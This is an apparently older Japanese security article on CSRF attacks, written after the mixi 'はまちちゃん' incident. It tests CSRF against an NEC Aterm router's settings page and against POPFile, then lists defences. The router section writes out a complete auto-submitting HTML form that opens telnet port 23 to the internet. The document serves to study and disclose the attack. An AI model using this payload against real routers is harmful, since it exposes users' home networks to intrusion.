x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第1章: CSRF ---

著者：金床

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　mixiにおいて「はまちちゃん」騒動を起こしたCSRF（Cross Site Request For
geries）攻撃。先日Kenji氏とeagle0wl氏との席で話題に上がりました。

金床「シーエスアール…えーっと、なんだっけ？はまちちゃん」
eagle0wl氏「Cross Site Request Forgeriesですね」
金床「そうそう、それ。めんどいから日本語訳は『はまちちゃん』でいいよね」

　ということで読みにくさが目立つこの攻撃ですが、実は発音としては「シーサ
ーフ」というのが正しいらしいです。

○参照URL
http://www.tux.org/~peterw/csrf.txt

　さてこのシーサーフですが、ワタクシ実ははまちちゃん事件が起こるまで全く
意識しておりませんでした。全くダメダメ。普段ウェブアプリのセキュリティが
うんぬんとかほざいているくせにこのていたらくです。ということで、今回は個
人的に新ネタ（わら）であるシーサーフについて書いてみます。


■0x02.) ウェブブラウザとHTTPリクエスト

　僕たちがウェブサイトを訪れるときには、ウェブサーバーに対してHTTPリクエ
ストを送信し、HTTPレスポンスを受信します。HTTPレスポンスはヘッダー部とボ
ディ部に分かれていて、ボディ部は僕らがアクセスしようとしたページのHTML部
分であったり、そこに含まれる画像のデータだったりします。ブックマークを選
んだり、URL入力欄に目的のURLを入力してウェブサイトにアクセスした場合、一
番最初に送信されてくるHTTPレスポンスは、このURLに対応したものになります。

　もう数年前になってしまいますが、「ハッキングツール・プログラミング大全」
という本を書かせて頂いたことがあります。この本の付属CD-ROMに収録されてい
る小さなプログラム、httpc.exeを持っている方はぜひここで使ってください。持
っていない方はtelnetクライアントでHTTPリクエストを送信するか、あるいはwget
のようなHTTPクライアントプログラムを使ってもよいでしょう。

　これらの簡易HTTPクライアントプログラムを使って、http://www.microsoft.com/
というURLにアクセスしてみます。HTTPリクエストがマイクロソフトのウェブサー
バーに対して送信され、レスポンスとして22,000バイト程度のHTMLファイルが返
信され、通信が終了します。ここで注目して欲しいのは、送受信されたデータは
すべてテキストやHTMLであり、画像データのようなバイナリデータは含まれてい
ないということです。

　次に、IEなどの通常のウェブブラウザを使って、同じようにhttp://www.microsoft.com/
にアクセスしてみます。すると、画像ファイルをいくつも含む、きれに整形され
たウェブページが表示されます。簡易HTTPクライアントプログラムを使った場合
と通常のウェブブラウザを使った場合とで、このような違いがあるのは何故でし
ょうか。この違いを確かめるために、同じく拙著「ハッキングツール・プログラ
ミング大全」のCD-ROMに収録されているhttpproxy.exeか、あるいはEtherealなど
のパケットスニッファを使い、通常のウェブブラウザでアクセスしたときの様子
を観察してみます。すると、通常のウェブブラウザを使ってアクセスした場合に
は、HTTPリクエストの送信とHTTPレスポンスの受信（以後HTTPセッションと呼び
ます）が24回も発生していることが分かります。このうち大部分は画像ファイル
を取得するもので、例えば以下のようなURLに対するHTTPセッションが発生してい
ることがわかります。

http://i.microsoft.com/h/en-us/i/drivers2_2_8.jpg
http://i.microsoft.com/h/en-us/i/the_boss_4_8.jpg
http://i.microsoft.com/h/en-us/i/travel_tips_4_8.jpg
http://i.microsoft.com/h/en-us/r/popular_downloads.gif
http://i.microsoft.com/h/en-us/r/b.gif
http://i.microsoft.com/h/en-us/r/popular_searches.gif
http://i.microsoft.com/h/en-us/r/support.gif
http://i.microsoft.com/h/en-us/r/for_your_home.gif

　http://www.microsoft.com/というひとつのURLにアクセスするように操作した
だけにもかかわらず、ウェブブラウザは結果的には24もの異なるURLに対してリソ
ースの取得を行います。これは、一体どうしてでしょうか。

　これは、ウェブブラウザがその機能を果たすために、ある意味勝手に行ってい
ることなのです。つまり、最初に取得したhttp://www.microsoft.com/のHTMLを解
釈し、その中にIMGタグなどがあれば、それに対応するリソースの取得を自動的に
行うのです。ちなみに、これらの画像の自動取得はオプションからオフにできる
場合があります。
　このように、通常のウェブブラウザを使う限り、僕たちが意識しないHTTPセッ
ションが裏で大量に発生することを覚悟しなければなりません。また、上にいく
つかあげた画像ファイルのURLのホスト名に注目してみると、"i.microsoft.com"
となっており、これは最初にウェブブラウザに対して指定したURLのホスト名"ww
w.microsoft.com"とは異なっています。このように、IMGタグなどがあれば、全く
別のホストに対してでもHTTPセッションが発生してしまうというのが、現在一般
的に使われているウェブブラウザの仕組みなのです。ウェブブラウザはユーザが
指定した以外のホストとも、裏で勝手に通信を行ってしまいます。これは通常の
ウェブブラウザが便利（自動的に画像を表示してくれたりする）であることの代
償であるともいえます。

　IMGタグ以外にも、JavaScriptを使うなど、ユーザが意識しないHTTPセッション
を発生させる方法はたくさんあります。


■0x03.) CSRF

　このように、IMGタグなどによって、ユーザが意識しないうちにウェブブラウザ
がネットワーク上の色々なウェブサーバーと通信を行ってしまう可能性があるこ
とがわかりました。CSRFはこの原理を利用した攻撃です。通常、ユーザが意識し
ないうちに発生するHTTPセッションは、画像ファイルやCSSファイルなどを取得
してくるだけであり、特に害はありません。しかし、これがウェブアプリケーシ
ョンなどに対するリクエストとして仕組まれていると、非常に面白いことになっ
てきます。

　先日mixiで発生したはまちちゃん騒動では、この「ユーザが意識しないうちに
発生するHTTPセッション」が、mixiの「日記を書く」という機能に対するものと
して仕組まれていました。僕の記憶では、このHTTPセッションはIMGタグを使った
ものではなく、JavaScriptを使ってフォームをsubmitさせることで実現されてい
たように思います。

　CSRFの特徴は、発生するHTTPセッションが、攻撃者のものではなく、被害者の
ウェブブラウザによるものであるということです。そのため、いわゆる「ログオ
ン」してから色々な操作をするウェブアプリケーションの、内部に対しての攻撃
が可能になっています。
　mixiを例に取りましょう。mixiではまず最初にユーザIDとパスワードを入力し
てログオンします。その後、自分のアカウントに対して日記を書いたり、さまざ
まな操作が可能になります。一度ログオンするとウェブサーバーとウェブブラウ
ザの間ではCookieを通じて認証が確認されるようになり、意図的にログオフした
りウェブブラウザを閉じたりしない限り、その後のHTTPセッションはすべて認証
済みの状態で行われます。

　攻撃者は被害者のユーザIDやパスワードはわかりませんが、被害者のログオン
済みのウェブブラウザに対して「日記を書け！」と命令します。被害者のウェブ
ブラウザは認証を通り抜けて日記を書いてしまい、攻撃が成功します。攻撃者は
被害者のアカウントを乗っ取る必要はありません。なぜなら、攻撃となる通信を
行うのは他ならぬ被害者自身だからです。mixiのようにCookieを認証に使用して
いるサイトの場合、この攻撃は非常に有効です。


■0x04.) ローカルを攻撃

　CSRFによってmixiのようなごく普通のウェブアプリケーションに対する攻撃が
行われることがありますが、さらに興味深いのは、被害者のローカル環境で動作
しているウェブアプリケーションに対しても攻撃が行われる可能性があるという
ことです。ローカル環境で動作しているウェブアプリケーションとは、http://1
27.0.0.1/hogeやhttp://192.168.0.1/fugaのような、プライベートIPアドレスで
動作しているウェブアプリケーションを指します。企業や学校などのイントラネ
ットで動作しているものや、ウェブブラウザを使って設定できるルータなどの機
器もこれに当たります。通常これらのローカル環境で動作しているウェブアプリ
ケーションには攻撃者は直接はアクセスできないため、攻撃の標的とはならない
ように思えますが、CSRFは被害者のウェブブラウザがアクションを起こすことに
より達成される攻撃であるため、これらのローカル環境で動作するウェブアプリ
ケーションが格好の標的となります。そこで、今回はローカル環境で動作してい
るウェブアプリケーションに対して、CSRFが有効であるかどうかを検証してみま
した。


■0x05.) ルータ設定画面にCSRF

　まず、我が家で使用しているADSLルータの設定画面にCSRFしてみました。この
ルータはNEC製のAtermという機種で、telnetでログインできるようになっていま
すが、普通はウェブブラウザを使って80番ポートにアクセスし、各種の設定を行
うようになっています。この80番ポートで提供されるウェブアプリケーションは
認証にBasic認証を用いており、一度ログオンするとその後はAuthorizationフィ
ールドが自動的にHTTPヘッダーに追加され、ユーザが意識することなくログオン
状態を保ったままで操作が行われることになります。CSRFの視点からすると、Ba
sic認証を用いたウェブアプリケーションはCookieを使用しているものと同じよう
な感じで、どちらもCSRF向き（CSRFによる攻撃に弱い）といえます。

　ADSLルータの設定画面で行うことのできる操作は数多くありますが、その中で
も特に攻撃者に狙われそうなものとして、次のようなものがあげられます。

・DNSサーバーのIPアドレスの設定
・パケットフィルタの設定
・ポートマッピングの設定
・ルーティングの設定
・通信の切断

　今回はこのうち「パケットフィルタの設定」に対して攻撃を仕掛け、通常では
遮断されるはずの、外部（WAN側）からのADSLルータのtelnetポートへのアクセス
を可能にしてみます。つまり、CSRFを使って攻撃によって、インターネット側の
23番ポートをこじ開けてみます。

　Atermのパケットフィルタの設定は、あらかじめ設定されたポート番号ごとのフ
ィルタが「エントリ」として列挙されており、それぞれのエントリについてLAN側
とWAN側それぞれの拒否・許可をチェックボックスによって選択し、「適用」と書
かれたボタンを押すことでルータの設定が変更されます。この設定の変更はルー
タの再起動後に有効になります。

　デフォルトの状態で23番ポートの通信を制御するフィルタが4番目のエントリと
して登録されており、LAN側は許可、WAN側は拒否するようになっています。管理
者として正しくこの設定画面にアクセスし、WAN側の設定を「許可」にする場合、
ADSLルータに対してPOSTメソッドを使ったHTTPリクエストが発生します。このHT
TPリクエストのボディ部はa=b&c=dのような形になっており、CGIプログラムを作
った人ならばお馴染みのとおり、「パラメータ名=パラメータの値」を&で繋いだ
ものとなっています。これらのパラメータの名前と値が分かりやすいように整形
すると、以下のようになることがわかりました。

-----
No0001F011str=PPPoE
No00A21051str=1
No00301000=22
No00301212=
No00302000=1
No00302112=
No00801000=22
No00801211=1
No00802000=1
No00802111=1
No00818071str=0
No00450000dummy=%93K%97p
No00802120=1
No00802120=2
No00802120=3
No00801220=5
No00801220=7
No00802120=8
No00802120=9
No00802120=10
No00802120=11
No00802120=12
No00802120=13
No00801220=14
No00801220=15
No00801220=16
No00801220=17
No00801220=18
No00450000=
No00450011=sys
-----

　CSRF攻撃を仕掛ける側は、これらの「フォームによってsubmitされるパラメー
タの名前と値のペア」を事前に把握し、HTMLファイルに仕組んでおきます。そし
て被害者がそのHTMLファイルにアクセスするよう仕向け、アクセスした瞬間にJa
vaScriptを使ってフォームをsubmitしてしまえばよいというわけです。

　上のパラメータ一覧を見て注意して欲しいのは、このパラメータの一覧には認
証に使われるものが何一つ含まれていないということです。前述したとおりこの
ルータの設定画面において認証にはBasic認証が使われており、フォームからsub
mitされるパラメータは認証には一切使用されません。そのため、ユーザ名とパス
ワードがどんなものであっても、これらのパラメータ一覧は常に同じ値を取り、
攻撃者は正確な内容のパラメータを用意することができます。攻撃者が用意する
HTMLファイルは以下のようなものになります。

-----
<html>
<body onLoad="javascript:document.forms[ 0 ].submit();">
<form action="http://192.168.0.1/entry_ipfilter_main_top.html"
 method="POST">
<input type="hidden" name="No0001F011str" value="PPPoE">
<input type="hidden" name="No00A21051str" value="1">
<input type="hidden" name="No00301000" value="22">
<input type="hidden" name="No00301212" value="">
<input type="hidden" name="No00302000" value="1">
<input type="hidden" name="No00302112" value="">
<input type="hidden" name="No00801000" value="22">
<input type="hidden" name="No00801211" value="1">
<input type="hidden" name="No00802000" value="1">
<input type="hidden" name="No00802111" value="1">
<input type="hidden" name="No00818071str" value="0">
<input type="hidden" name="No00802120" value="1">
<input type="hidden" name="No00802120" value="2">
<input type="hidden" name="No00802120" value="3">
<input type="hidden" name="No00801220" value="5">
<input type="hidden" name="No00801220" value="7">
<input type="hidden" name="No00802120" value="8">
<input type="hidden" name="No00802120" value="9">
<input type="hidden" name="No00802120" value="10">
<input type="hidden" name="No00802120" value="11">
<input type="hidden" name="No00802120" value="12">
<input type="hidden" name="No00802120" value="13">
<input type="hidden" name="No00801220" value="14">
<input type="hidden" name="No00801220" value="15">
<input type="hidden" name="No00801220" value="16">
<input type="hidden" name="No00801220" value="17">
<input type="hidden" name="No00801220" value="18">
<input type="hidden" name="No00450000" value="">
<input type="hidden" name="No00450011" value="sys">
<input type="hidden" name="No00450000dummy" 
value="%93K%97p">
</form>
</body>
</html>
-----

　ここで、仮にADSLルータの設定画面のURLがhttp://192.168.0.1/であるとして
います。このURLは普通、ルータの出荷時の状態のものがそのまま使われます。家
庭内ネットワークのアドレスをわざわざ変更している場合にはこのURLが攻撃者
にとって予測できないものになるため、CSRF攻撃に対する防御として有効なもの
になります。

　さて上に示したHTMLファイルにアクセスすると、すぐにフォームがsubmitされ、
ADSLルータの設定画面（ウェブアプリケーション）に対してPOSTリクエストが送
信されます。ここで攻撃が成功するかどうかは、被害者のウェブブラウザがルー
タの設定画面にログオンしているかどうかによります。一度Basic認証をパスした
後であれば、このPOSTリクエストによってルータの設定が変更され、再起動後に
は23番ポートがWAN側に開け放たれてしまうことになります。そうでない場合には、
CSRF攻撃と同時にBasic認証に使用されるログオン用のダイアログが表示されます。
このダイアログの出現を不審に思い、キャンセルボタンを押せば攻撃は回避され
ます。

　以上のことからまとめると、ルータの設定画面のウェブアプリケーションに対
するCSRF攻撃は、以下の条件がすべて整ったときに成功すると考えられます。

・攻撃者が被害者のADSLルータの種類を正確に把握していること
・攻撃者が被害者のADSLルータの設定画面のURLを把握しているか、あるいはデフ
ォルトのURLが使用され、攻撃者もそのように想定していること
・被害者がADSLルータの設定画面にログオンしていること

　現実的には、これらの条件は整いにくいと思われるので、この攻撃は少し難し
い（おそらく成功しない）のではないかと思われます。…つまらない結論ですみ
ません（笑。


■0x06.) POPFileにCSRF

　次に、POPFileの設定画面に対するCSRF攻撃を試みてみました。POPFileは最近
よく見かけるSPAMメールを避けるためのソフトウェアで、特徴的なのは各種の設
定操作がすべてウェブブラウザによって行われる点です。つまり、設定画面がウ
ェブアプリケーションとして動作しています。デフォルトの状態で設定画面のURL
はhttp://127.0.0.1:8080/となります。ADSLルータの場合と同様、このデフォル
トのポート番号を変更していれば、CSRF攻撃に対して有効な防御となります。

　POPFileの設定画面でできる各種の操作のうち、攻撃者が興味を持ちそうなもの
として、リモートサーバー（POP3サーバー）のIPアドレスの変更があげられます。
POP3サーバーのIPアドレスを攻撃者が運用するプロキシサーバーなどに変更して
しまえば、メールの受信に必要なアカウントとパスワードが手に入るからです。
POPFileの設定画面においてPOP3サーバーのアドレスを変更する操作を行うと、以下の3つのパラメータを含むPOSTリクエストが発生します。

-----
server=mail.jumperz.net
update_server=%C5%AC%CD%D1
session=JCfCU7Xu49
-----

　ひとつ目が変更後のPOP3サーバーのアドレス（もしくはホスト名）、2つ目はボ
タンに書かれている「適用」の文字（おそらく意味は持ちません）、3つ目がセッ
ションIDです。ここで重要なのが3つ目のセッションIDです。このセッションIDは
一定ではなく、POPFileを再起動すれば異なる値になります。このため、攻撃者は
正しい値を事前に用意することができません（ただし、クロスサイトスクリプテ
ィングの脆弱性があれば用意できます）。そのため、結論として、CSRF攻撃は成
立しません。POPFileの設定画面のウェブアプリケーションにはCSRF攻撃は通用し
ないのです。

　このように、認証をCookieやBasic認証ではなく、フォームの要素として用いる
ウェブアプリケーションは、CSRF攻撃に強いと言えます。


■0x07.)　まとめ

　このように、イントラネットで稼働しているウェブアプリケーションに対して
CSRF攻撃を仕掛け、どんな条件ならば攻撃が成立するのか、あるいは攻撃によっ
てどんなことが可能なのかを簡単に見てきました。ADSLルータに対する攻撃では
事前に被害者のルータの種類などを把握している必要があります。例えば某Yah●
●BBのような、多くのユーザを抱えるISPなどの場合、みなが同じルータで同じよ
うな設定をしている可能性が高く、そのような状況では無差別に大量のユーザに
対して仕掛けられるCSRF攻撃が成功する可能性もそれほど低くはないのではない
かと思います。

　CSRF攻撃に対する防御はウェブアプリケーションを作る側の責任のように思わ
れがちですが、ユーザ側でも

・あやしいものを踏まない
・ログオンするタイプのアプリケーションでは、用が済んだらログオフする、Ba
sic認証の場合にはブラウザを再起動する
・ローカルプロキシ上でリファラーチェックを行い、異なるホスト間でフォーム
がsubmitされた場合には通信を切断する

などの手段で防御することが可能です。ウェブアプリケーションあるところにCS
RF攻撃あり。今後ありとあらゆるアプリケーションがますますウェブ化すること
が予想されますので、みなさん充分に気をつけてください。


